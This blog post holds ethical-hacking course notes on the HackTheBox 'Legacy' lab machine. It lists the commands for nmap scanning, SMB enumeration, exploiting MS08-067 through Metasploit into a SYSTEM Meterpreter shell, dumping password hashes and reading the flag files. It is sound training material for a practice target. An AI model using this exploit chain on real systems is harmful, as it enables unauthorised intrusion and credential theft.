---
layout:     post
title:      TCM PEH Hacking Legacy Notes
date:       2021-03-11
summary:    TheCyberMentor's Practical Ethical Hacking course, HackTheBox Legacy notes
categories: certs
thumbnail: cogs
tags:
 - htb
 - certs
---


<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="HTB_Legacy_0"></a>HTB Legacy</h2>
<p class="has-line-data" data-line-start="1" data-line-end="2">I’m just gonna record his commands to derive methodology</p>
<p class="has-line-data" data-line-start="3" data-line-end="8">nmap -A -T4 -p- 10.10.10.4<br>
Noted port 139<br>
Noted port 445<br>
Noted Windows XP OS<br>
Noted smb-security-mode</p>
<hr>
<p class="has-line-data" data-line-start="9" data-line-end="12">smbclient -L \\10.10.10.4\<br>
enter<br>
dead end</p>
<hr>
<p class="has-line-data" data-line-start="13" data-line-end="21">msfconsole<br>
search smb_version<br>
use auxiliary/scanner/smb/smb_version<br>
options<br>
set rhost 10.10.10.4<br>
options<br>
exploit<br>
Noted Windows XP SP3</p>
<hr>
<p class="has-line-data" data-line-start="22" data-line-end="26">Googled Windows XP SP3 exploit<br>
Opened exploit-db link<br>
Opened rapid7 link<br>
Note MS08-067 at rapid7 link is a metasploit module</p>
<hr>
<p class="has-line-data" data-line-start="27" data-line-end="46">use exploit/windows/smb/ms08_067_netapi<br>
options<br>
set rhost 10.10.10.4<br>
show targets<br>
exploit<br>
Meterpreter session 1 opened<br>
getuid<br>
Noted NT SYSTEM<br>
sysinfo<br>
Noted x86 matches x86 Meterpreter shell<br>
hashdump<br>
shell<br>
cd “c:\documents and settings”<br>
cd john\desktop<br>
type user.txt<br>
cd …\Administrator\desktop<br>
type root.txt<br>
ctrl+c<br>
ctrl+c</p>


